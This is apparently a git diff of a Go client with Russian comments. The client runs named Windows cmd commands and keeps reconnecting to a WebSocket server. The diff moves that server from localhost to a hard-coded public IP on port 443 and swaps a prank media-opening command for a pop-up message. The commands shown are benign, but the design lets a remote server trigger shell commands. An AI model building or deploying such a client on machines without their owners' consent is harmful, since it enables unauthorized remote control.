@@ -35,16 +35,10 @@ func main() {
 	commands = loadCommandsFromFile("commands.json")
 
 	// Добавление новых команд
-	commands = addCommand(commands, "Hello, world!", commandStruct{
+	commands = addCommand(commands, "Start message", commandStruct{
 		Category:    "system",
-		Args:        []string{"cmd", "/C", "echo Hello, world!"},
-		Description: "Выводит в командную строку Windows \"Hello world!\"",
-	})
-
-	commands = addCommand(commands, "Fimoz", commandStruct{
-		Category:    "media",
-		Args:        []string{"cmd", "/C", "start", "Z:\\No_Laitis\\O_HET_FIMOZ.mp3", "&&", "start", "Z:\\No_Laitis\\ShUE_PPSh.gif"},
-		Description: "SHUE PPsh",
+		Args:        []string{"cmd", "/C", "msg * \"Выполнение команд работает корректно!\""},
+		Description: "Выводит на экран сообщение об успешном запуске программы",
 	})
 
 	//commands.Execute("Play_92")
@@ -73,7 +67,7 @@ func connectToWebSocket() {
 
 	// Устанавливаем соединение с сервером
 	for {
-		conn, _, err = websocket.DefaultDialer.Dial("ws://localhost:8282/ws", nil)
+		conn, _, err = websocket.DefaultDialer.Dial("ws://185.72.144.59:443/ws", nil)
 		if err != nil {
 			for {
 				// Цикл попыток подключения к серверу
@@ -93,7 +87,7 @@ func connectToWebSocket() {
 	}
 	// Закрываем соединение в случае выхода из цикла ожидания сообщений(если программа завершится пользователем)
 	defer conn.Close()
-	log.Println("✔️ Подключено к WebSocket серверу")
+	log.Println("✔️ Успешно подключено к WebSocket серверу")
 	// Цикл ожидания сообщений от сервера
 	for {
 		_, message, err := conn.ReadMessage()
